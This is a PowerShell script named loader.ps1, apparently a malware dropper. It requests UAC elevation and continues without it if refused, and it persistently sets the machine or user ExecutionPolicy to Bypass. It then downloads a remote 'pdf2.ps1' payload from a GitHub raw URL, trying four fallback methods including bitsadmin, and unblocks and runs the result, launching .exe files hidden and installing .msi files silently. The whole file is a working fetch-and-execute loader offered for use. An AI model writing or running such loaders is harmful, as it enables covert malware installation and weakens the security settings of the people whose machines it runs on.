# =============================================================================
# loader.ps1 - robust bootstrap for pdf2.ps1 (Windows PowerShell 5.1+)
#
# What it does, in order:
#   1. Forces TLS 1.2 (stock Win10/Win11 PowerShell 5.1 compatible).
#   2. Attempts UAC elevation by relaunching itself with -Verb RunAs; if the
#      user declines the prompt or elevation is unavailable, it logs the
#      refusal and CONTINUES unelevated (%TEMP% needs no admin rights).
#   3. Loosens ExecutionPolicy: Process scope always, plus LocalMachine
#      (when elevated) or CurrentUser (unelevated) best-effort.
#   4. Downloads the payload with a 4-method fallback chain per round:
#      Invoke-WebRequest -> Net.WebClient -> curl.exe -> bitsadmin,
#      N rounds, linear backoff, size validation, HTML-error-page rejection.
#   5. Unblocks the file and executes it by extension (.ps1/.exe/.msi/other).
#
# Usage:
#   powershell -nop -ep bypass -File loader.ps1 [-Url <u>] [-OutFile <p>]
#              [-NoRun] [-NoElevate] [-Retries 3] [-TimeoutSec 40]
#
# Exit codes: 0 = success (or -NoRun download-only) | 2 = all downloads failed
#             4 = payload execution failed
# =============================================================================

param(
    [string]$Url = 'https://raw.githubusercontent.com/pentoshi007/test/main/pdf2.ps1',
    [string]$OutFile = '',
    [switch]$NoRun,
    [switch]$NoElevate,
    [int]$Retries = 3,
    [int]$TimeoutSec = 40
)

$ErrorActionPreference = 'Continue'

# ----------------------------- logging ---------------------------------------
$logDir = $env:TEMP
try {
    if ($PSCommandPath) {
        $d = Split-Path -Parent $PSCommandPath
        if ($d -and (Test-Path -LiteralPath $d)) { $logDir = $d }
    }
} catch { }
$script:LogPath = Join-Path $logDir 'loader.log'

function Write-Log {
    param([string]$Message, [string]$Level = 'INFO')
    $line = '{0} [{1}] {2}' -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $Level, $Message
    try { Add-Content -LiteralPath $script:LogPath -Value $line -ErrorAction Stop } catch { }
    Write-Host $line
}

# ----------------------------- TLS 1.2 ---------------------------------------
# NOTE: Tls13 does not exist in the .NET Framework 4.x enum used by PS 5.1.
try {
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
} catch {
    Write-Log ('TLS bootstrap failed: {0}' -f $_.Exception.Message) 'WARN'
}

# ----------------------------- helpers ---------------------------------------
function Test-Admin {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $pr = New-Object Security.Principal.WindowsPrincipal($id)
    return $pr.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Enable-Perms {
    # Process scope never needs admin and always applies to this session.
    try {
        Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force -ErrorAction Stop
        Write-Log 'ExecutionPolicy Process=Bypass set.'
    } catch {
        Write-Log ('Process-scope policy failed: {0}' -f $_.Exception.Message) 'WARN'
    }
    if (Test-Admin) {
        try {
            Set-ExecutionPolicy -Scope LocalMachine -ExecutionPolicy Bypass -Force -ErrorAction Stop
            Write-Log 'ExecutionPolicy LocalMachine=Bypass set.'
        } catch {
            Write-Log ('LocalMachine policy failed: {0}' -f $_.Exception.Message) 'WARN'
        }
    } else {
        try {
            Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force -ErrorAction Stop
            Write-Log 'ExecutionPolicy CurrentUser=Bypass set.'
        } catch {
            Write-Log ('CurrentUser policy failed: {0}' -f $_.Exception.Message) 'WARN'
        }
    }
}

function Invoke-ElevatedRestart {
    # Relaunch this exact script elevated. The child gets -NoElevate so it
    # can never loop. Throws if UAC is declined/unavailable.
    param([string]$SelfPath)

    $a = New-Object System.Collections.Generic.List[string]
    $a.Add('-NoProfile')
    $a.Add('-ExecutionPolicy')
    $a.Add('Bypass')
    $a.Add('-File')
    $a.Add(('"{0}"' -f $SelfPath))
    $a.Add('-NoElevate')
    $a.Add('-Url');               $a.Add(('"{0}"' -f $Url))
    $a.Add('-OutFile');           $a.Add(('"{0}"' -f $OutFile))
    if ($NoRun)                { $a.Add('-NoRun') }
    $a.Add('-Retries');           $a.Add([string]$Retries)
    $a.Add('-TimeoutSec');        $a.Add([string]$TimeoutSec)

    Write-Log 'Relaunching elevated (UAC prompt)...'
    $proc = Start-Process -FilePath 'powershell.exe' -ArgumentList ($a -join ' ') -Verb RunAs -Wait -PassThru
    return $proc.ExitCode
}

function Get-RemoteFile {
    param([string]$Source, [string]$Destination, [int]$Attempts, [int]$Timeout)

    for ($attempt = 1; $attempt -le $Attempts; $attempt++) {
        $part = "$Destination.part"
        foreach ($method in @('iwr', 'webclient', 'curl', 'bitsadmin')) {
            try {
                if (Test-Path -LiteralPath $part) { Remove-Item -LiteralPath $part -Force -ErrorAction SilentlyContinue }

                switch ($method) {
                    'iwr' {
                        Write-Log ('[{0}/{1}] downloading via Invoke-WebRequest' -f $attempt, $Attempts)
                        Invoke-WebRequest -Uri $Source -OutFile $part -UseBasicParsing -TimeoutSec $Timeout -ErrorAction Stop | Out-Null
                    }
                    'webclient' {
                        Write-Log ('[{0}/{1}] downloading via Net.WebClient' -f $attempt, $Attempts)
                        $wc = New-Object System.Net.WebClient
                        try {
                            $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
                            $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
                        } catch { }
                        $wc.DownloadFile($Source, $part)
                    }
                    'curl' {
                        Write-Log ('[{0}/{1}] downloading via curl.exe' -f $attempt, $Attempts)
                        & curl.exe --fail -sS -L --connect-timeout $Timeout --max-time ($Timeout * 3) -o $part $Source > $null 2>&1
                        if ($LASTEXITCODE -ne 0) { throw ('curl.exe exited {0}' -f $LASTEXITCODE) }
                    }
                    'bitsadmin' {
                        Write-Log ('[{0}/{1}] downloading via bitsadmin' -f $attempt, $Attempts)
                        & bitsadmin /transfer ('loaderdl_{0}' -f $attempt) /download /priority normal $Source $part > $null 2>&1
                        if ($LASTEXITCODE -ne 0) { throw ('bitsadmin exited {0}' -f $LASTEXITCODE) }
                    }
                }

                if ((Test-Path -LiteralPath $part) -and ((Get-Item -LiteralPath $part).Length -gt 0)) {
                    # Reject HTML error pages / CDN soft-errors masquerading as payload.
                    $len = (Get-Item -LiteralPath $part).Length
                    $head = [IO.File]::ReadAllBytes($part)[0..([Math]::Min(15, $len - 1))]
                    $text = [Text.Encoding]::ASCII.GetString($head)
                    if ($text.TrimStart() -match '^<(!doctype|html|\?xml)') {
                        throw 'response looks like an HTML error page, not the payload'
                    }
                    Move-Item -LiteralPath $part -Destination $Destination -Force
                    Write-Log ('Download OK -> {0} ({1} bytes)' -f $Destination, $len)
                    return $true
                }
                throw 'output file missing or empty'
            } catch {
                Write-Log ('{0} failed: {1}' -f $method, $_.Exception.Message) 'WARN'
            }
        }
        if ($attempt -lt $Attempts) {
            $wait = $attempt * 5
            Write-Log ('All methods failed this round; retrying in {0}s' -f $wait) 'WARN'
            Start-Sleep -Seconds $wait
        }
    }
    Write-Log ('All {0} download rounds failed for {1}' -f $Attempts, $Source) 'ERROR'
    return $false
}

function Start-Payload {
    param([string]$Path)
    $ext = [IO.Path]::GetExtension($Path).ToLowerInvariant()
    try {
        switch ($ext) {
            '.ps1' {
                Write-Log ('Executing payload in-process: {0}' -f $Path)
                & $Path
            }
            '.exe' {
                Write-Log ('Starting executable: {0}' -f $Path)
                Start-Process -FilePath $Path -WindowStyle Hidden
            }
            '.msi' {
                Write-Log ('Installing MSI: {0}' -f $Path)
                Start-Process -FilePath 'msiexec.exe' -ArgumentList ('/i "{0}" /qn' -f $Path) -WindowStyle Hidden -Wait
            }
            default {
                Write-Log ('Handing {0} to cmd.exe' -f $Path)
                & cmd.exe /c ('"{0}"' -f $Path)
            }
        }
        return $true
    } catch {
        Write-Log ('Payload execution failed: {0}' -f $_.Exception.Message) 'ERROR'
        return $false
    }
}

# ------------------------------- main ----------------------------------------
$isAdmin = Test-Admin
Write-Log ('loader start | admin={0} | url={1} | retries={2} | timeout={3}s' -f $isAdmin, $Url, $Retries, $TimeoutSec)

# Resolve default destination: %TEMP%\<basename> (no admin needed, unlike C:\).
if (-not $OutFile) {
    $name = [IO.Path]::GetFileName(($Url.Split('?')[0]))
    if (-not $name) { $name = 'payload.bin' }
    $OutFile = Join-Path $env:TEMP $name
}
Write-Log ('Output file: {0}' -f $OutFile)

# Resolve a runnable path to THIS script (needed for the elevated relaunch).
$selfPath = $null
try { if ($PSCommandPath -and (Test-Path -LiteralPath $PSCommandPath)) { $selfPath = $PSCommandPath } } catch { }
if (-not $selfPath) {
    try {
        $def = $MyInvocation.MyCommand.Definition
        if ($def -and ($def -like '*.ps1') -and (Test-Path -LiteralPath $def)) { $selfPath = $def }
    } catch { }
}
if (-not $selfPath) {
    # Invoked via iex/iwr pipe: materialize this exact source to %TEMP% so the
    # elevated child can run it with -File.
    try {
        $src = $MyInvocation.MyCommand.ScriptBlock.ToString()
        $selfPath = Join-Path $env:TEMP 'loader_self.ps1'
        [IO.File]::WriteAllText($selfPath, $src)
        Write-Log ('Materialized self to {0} (inline mode)' -f $selfPath)
    } catch {
        Write-Log ('Could not resolve self path ({0}); elevation unavailable.' -f $_.Exception.Message) 'WARN'
    }
}

# Elevation: try once; a declined UAC prompt must NOT kill the run.
if (-not $isAdmin -and -not $NoElevate) {
    if ($selfPath) {
        try {
            $childCode = Invoke-ElevatedRestart -SelfPath $selfPath
            Write-Log ('Elevated child finished with exit code {0}' -f $childCode)
            if ($null -ne $childCode) { exit ([int]$childCode) }
            exit 0
        } catch {
            Write-Log ('Elevation refused/unavailable ({0}) - continuing unelevated.' -f $_.Exception.Message) 'WARN'
        }
    } else {
        Write-Log 'Cannot elevate (no self path) - continuing unelevated.' 'WARN'
    }
}

Enable-Perms

if (-not (Get-RemoteFile -Source $Url -Destination $OutFile -Attempts $Retries -Timeout $TimeoutSec)) {
    exit 2
}

try { Unblock-File -LiteralPath $OutFile -ErrorAction SilentlyContinue } catch { }
Write-Log ('Payload ready: {0}' -f $OutFile)

if ($NoRun) {
    Write-Log '-NoRun specified; skipping execution.'
    exit 0
}

if (Start-Payload -Path $OutFile) {
    Write-Log 'Loader finished successfully.'
    exit 0
}
exit 4
